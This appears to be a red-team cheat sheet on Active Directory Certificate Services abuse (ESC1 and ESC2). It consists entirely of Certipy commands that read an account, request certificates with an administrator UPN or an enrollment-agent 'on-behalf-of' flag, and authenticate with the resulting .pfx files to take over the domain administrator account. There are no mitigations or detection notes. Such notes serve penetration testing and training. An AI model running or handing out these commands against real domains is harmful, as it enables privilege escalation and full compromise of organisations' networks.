### ESC1 
#### Exploitation
- Linux
    ```bash
    certipy-ad account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read
    ```
    ```bash
    certipy-ad req \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'VulnTemplate' \
        -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
    ```
    ```bash 
    certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
    ```

### ESC2
#### Exploitation
- Linux
    ```bash
    certipy req \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'AnyPurposeCert'
    ``` 
    ```bash
    certipy req \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'User' \
        -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
    ```
    ```bash
    certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'  
    ```

